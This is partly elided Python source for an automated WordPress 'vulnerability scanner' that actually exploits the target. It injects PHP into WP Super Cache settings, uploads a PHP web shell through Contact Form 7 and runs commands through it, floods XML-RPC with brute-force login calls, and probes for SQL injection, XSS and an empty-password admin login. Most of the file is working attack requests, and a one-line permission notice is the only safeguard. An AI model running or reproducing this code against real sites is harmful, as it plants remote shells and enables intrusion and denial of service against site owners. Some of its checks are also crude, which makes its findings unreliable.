...
class WordPressScanner:
    ...
    def test_wp_super_cache_rce(self, plugins):
        ...
        data = {
            ...
            'wp_cache_location': f"/var/www/wp/wp-content/cache/';system($_GET[cmd]);include_once \'wp-cache-config.php\';'",
        }
        print("[*] Testing WP Super Cache RCE...")
        response = self.session.post(admin_url, headers={**self.headers, "Content-Type": "application/x-www-form-urlencoded"}, 
                                   params=params, data=data, verify=False)
        if response.status_code == 200:
            test_url = urljoin(self.target_url, "/?cmd=id")
            test_response = self.session.get(test_url, headers=self.headers, verify=False)
            if "uid=" in test_response.text:
                self.vulnerabilities.append(f"Plugin - wp-super-cache: Authenticated RCE Confirmed (Output: {test_response.text.strip()}) [Critical]")
                print("[!] Vulnerable to WP Super Cache RCE!")
            else:
                print("[-] No RCE detected in response.")
        else:
            print(f"[-] RCE test failed. Status: {response.status_code}")

    def test_contact_form_7_file_upload(self, plugins):
        """Test Contact Form 7 unrestricted file upload."""
        if "contact-form-7" not in plugins:
            print("[-] Skipping Contact Form 7 test: Plugin not found.")
            return
        upload_url = urljoin(self.target_url, '/wp-json/contact-form-7/v1/contact-forms/1/feedback')
        files = {'file': ('shell.php', '<?php system($_GET["cmd"]); ?>', 'application/octet-stream')}
        print("[*] Testing Contact Form 7 File Upload...")
        try:
            response = self.session.post(upload_url, files=files, headers=self.headers, verify=False)
            if response.status_code == 200 and "shell.php" in response.text:
                test_url = urljoin(self.target_url, '/wp-content/uploads/shell.php?cmd=id')
                test_response = self.session.get(test_url, headers=self.headers, verify=False)
                if "uid=" in test_response.text:
                    self.vulnerabilities.append(f"Plugin - contact-form-7: Unrestricted File Upload Confirmed (Output: {test_response.text.strip()}) [Critical]")
                    print("[!] Vulnerable to Contact Form 7 File Upload!")
            else:
                print("[-] No file upload vulnerability detected.")
        except Exception as e:
            print(f"[-] Error testing file upload: {e}")

    def test_xmlrpc_dos(self, wp_version):
        """Test XML-RPC DoS vulnerability."""
        if wp_version and wp_version < "5.8":
            xmlrpc_url = urljoin(self.target_url, '/xmlrpc.php')
            payload = '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>' + '<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><string>admin</string></value><value><string>wrongpass</string></value></data></array></value></member></struct></value>' * 1000 + '</data></array></value></param></params></methodCall>'
            print("[*] Testing XML-RPC DoS...")
            try:
                start_time = time.time()
                response = self.session.post(xmlrpc_url, data=payload, headers=self.headers, verify=False, timeout=10)
                elapsed = time.time() - start_time
                if response.status_code == 200 or elapsed > 5:
                    self.vulnerabilities.append(f"Core - {wp_version}: XML-RPC DoS Possible [High]")
                    print("[!] Potentially vulnerable to XML-RPC DoS!")
            except Exception:
                print("[-] XML-RPC test inconclusive (timeout or error).")
        else:
            print("[-] Skipping XML-RPC DoS test: Version not vulnerable or unknown.")

    def test_sql_injection(self):
        """Test for generic SQL Injection."""
        test_url = urljoin(self.target_url, "/?p=1'+OR+1=1--")
        ...
        try:
            ...
            if "mysql" in response.text.lower() or "sql" in response.text.lower() or "error" in response.text.lower():
                self.vulnerabilities.append("Core: SQL Injection Possible [Critical]")
    ...
    def test_xss(self):
        """Test for generic XSS."""
        test_url = urljoin(self.target_url, '/?s=<script>alert(1)</script>')
        print("[*] Testing Generic XSS...")
        try:
            response = self.session.get(test_url, headers=self.headers, verify=False)
            if "<script>alert(1)</script>" in response.text:
                self.vulnerabilities.append("Core: Unfiltered XSS Detected [Medium]")
    ...
    def test_auth_bypass(self):
        """Test for authentication bypass (e.g., CVE-2020-4050)."""
        login_url = urljoin(self.target_url, '/wp-login.php')
        data = {'log': 'admin', 'pwd': '', 'wp-submit': 'Log In', 'testcookie': '1', 'redirect_to': '/wp-admin/'}
        print("[*] Testing Authentication Bypass...")
        try:
            response = self.session.post(login_url, data=data, headers=self.headers, verify=False, allow_redirects=True)
            if "wp-admin" in response.url and "login" not in response.url:
                self.vulnerabilities.append("Core: Authentication Bypass Possible [Critical]")
    ...
    def run_all_exploits(self, wp_version, plugins):
        """Run all exploit tests."""
        self.test_wp_super_cache_rce(plugins)
        self.test_contact_form_7_file_upload(plugins)
        self.test_xmlrpc_dos(wp_version)
        self.test_sql_injection()
        self.test_xss()
        self.test_auth_bypass()

    def print_results(self):
        """Print all detected vulnerabilities."""
        print("\n=== Scan Results ===")
...
def main():
    print("=== Fully Automated WordPress Vulnerability Scanner ===")
    print("Note: Use only on sites you own or have permission to test.")
    target_url = input("Enter the target WordPress URL (e.g., http://example.com): ").strip()
    cookies_input = input("Enter authentication cookies (e.g., 'key=value; key2=value2') or press Enter to skip: ").strip()
    ...
    print("\n[*] Scanning target...")
    wp_version = scanner.get_wp_version()
    plugins = scanner.scan_plugins()
    themes = scanner.scan_themes()
    scanner.check_vulnerabilities(wp_version, plugins, themes)
    scanner.run_all_exploits(wp_version, plugins)
